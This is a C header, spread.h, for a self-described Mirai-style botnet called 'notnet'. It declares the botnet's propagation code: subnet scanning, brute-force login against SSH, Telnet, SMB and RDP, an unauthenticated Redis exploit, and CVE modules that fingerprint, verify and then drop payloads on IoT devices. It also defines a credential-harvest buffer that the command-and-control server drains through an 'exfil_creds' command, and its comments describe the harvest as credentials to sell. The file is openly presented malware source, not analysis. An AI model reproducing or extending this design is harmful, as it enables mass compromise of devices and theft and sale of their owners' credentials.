/*
 * notnet - Modern Mirai-Style Botnet
 * spread.h - Multi-vector spreading module
 *
 * Targets: SSH, Telnet, SMB, Redis, RDP
 */
#ifndef NOTNET_SPREAD_H
#define NOTNET_SPREAD_H

#include "protocol.h"

/* ── Spread Vectors ─────────────────────────────────────────── */
#define SPREAD_SSH     0x01
#define SPREAD_TELNET  0x02
#define SPREAD_SMB     0x04
#define SPREAD_REDIS   0x08
#define SPREAD_RDP     0x10

/* ── Target Structure ───────────────────────────────────────── */
typedef struct {
    char ip[16];
    uint16_t port;
    uint8_t service;
    uint8_t active;
} notnet_target_t;

/* ── Scan Result ────────────────────────────────────────────── */
typedef struct {
    char ip[16];
    uint16_t port;
    char banner[256];
    uint32_t open:1;
    uint32_t service:4; /* SPREAD_* */
} notnet_scan_result_t;

/* ── Core Functions ─────────────────────────────────────────── */
int spread_local(notnet_bot_t *bot);
int spread_target(notnet_bot_t *bot, notnet_target_t *target);
int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port);
int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
char *scan_ports(const char *target, uint16_t *ports, int port_count);
int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);

/* ── Service Spreaders ──────────────────────────────────────── */
int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port);
int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port);

/* ── CVE Exploitation Modules (#83) ─────────────────────────── */
/* Known-CVE checks for IoT/edge targets (CVE-2024-3721-class).
 * CVE-first: modules run before the brute-force spreaders in every
 * scan/spread dispatch; default-credential Telnet brute-force is
 * demoted to a fallback vector. Each module is three-phase and
 * fail-safe: probe (passive family fingerprint) -> verify
 * (non-destructive command-execution proof) -> drop (payload
 * delivery). A payload is never dropped without a positive verify. */
#define SPREAD_CVE     0x20

/* Module execution phases. */
typedef enum {
    CVE_PHASE_NONE   = 0,
    CVE_PHASE_PROBE,   /* fingerprint the family; no exploit traffic */
    CVE_PHASE_VERIFY,  /* non-destructive command-execution proof */
    CVE_PHASE_DROP     /* payload drop + execute (verify must pass) */
} cve_phase_t;

typedef struct {
    const char *id;       /* CVE identifier, e.g. "CVE-2024-3721" */
    const char *family;   /* device family, e.g. "TBK DVR-4104/4216" */
    uint16_t port;        /* service port the module targets */
    /* Fingerprint the target without exploiting. Returns 1 when the
     * target looks like the vulnerable family, 0/-1 otherwise.
     * banner (if non-NULL) receives a bounded response excerpt. */
    int (*probe)(const char *ip, uint16_t port, char *banner, size_t banner_len);
    /* Non-destructive RCE proof. Returns 1 only when command execution
     * is positively confirmed; payload drop is refused otherwise. */
    int (*verify)(const char *ip, uint16_t port);
    /* Payload drop over the confirmed channel. Returns 0 on success. */
    int (*drop)(notnet_bot_t *bot, const char *ip, uint16_t port);
} cve_module_t;

/* Run every module whose target port matches (all when port == 0) in
 * probe -> verify -> drop order. Returns 0 when a module dropped the
 * payload, -1 when nothing fired (caller falls back to brute-force). */
int cve_run_modules(notnet_bot_t *bot, const char *ip, uint16_t port);
int cve_module_count(void);
const cve_module_t *cve_module_at(int idx);

/* ── Service Helpers ────────────────────────────────────────── */
/* Returns socket fd on success (caller must close), -1 on failure.
 * SECURITY FIX (#15): Changed from int success to int fd so the caller
 * can send commands over the established connection. */
int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass);
int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass);
int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port);
int exploit_redis_sock(notnet_bot_t *bot, int sock);

/* ── Credential-log buffer (#90) ─────────────────────────── */
/* Smash-and-grab log-sale monetization. Every successful brute-force
 * credential is buffered here (bounded, mutex-protected) so the C2 can
 * pull the whole harvest via the `exfil_creds` command and sell it.
 * Each entry is one line "proto|ip|port|user|pass", capped at
 * CRED_LOG_ENTRY_MAX bytes.
 *
 * Overflow policy: DROP-NEWEST with a log_warn — the buffer is a fixed
 * ring that never grows, and a fresh credential is discarded rather than
 * evicting an older one the C2 has not yet pulled. The buffer is drained
 * (and cleared) by exfil_creds, so capacity resets to zero after each
 * pull. All functions are safe to call from scan threads and the C2 loop
 * (mutex-protected; spread.c uses the same pthread_mutex pattern as
 * src/proxy.c). */
#define CRED_LOG_MAX_ENTRIES 256
#define CRED_LOG_ENTRY_MAX   256

/* Append one harvested credential to the log. Fields are precision-capped
 * to fit CRED_LOG_ENTRY_MAX; the entry is dropped (with a log_warn) when
 * the buffer is full. Thread-safe. */
void spread_cred_record(const char *proto, const char *ip, uint16_t port,
                        const char *user, const char *pass);
/* Number of credentials currently buffered (for heartbeat cred_count). */
unsigned int spread_cred_count(void);
/* Drain the whole log into a caller-free'd heap buffer (one entry per
 * line, NUL-terminated) and clear the buffer. Returns 0 on success,
 * -1 on allocation failure. Thread-safe. */
int spread_creds_drain(char **out, size_t *out_len);
#endif /* NOTNET_SPREAD_H */
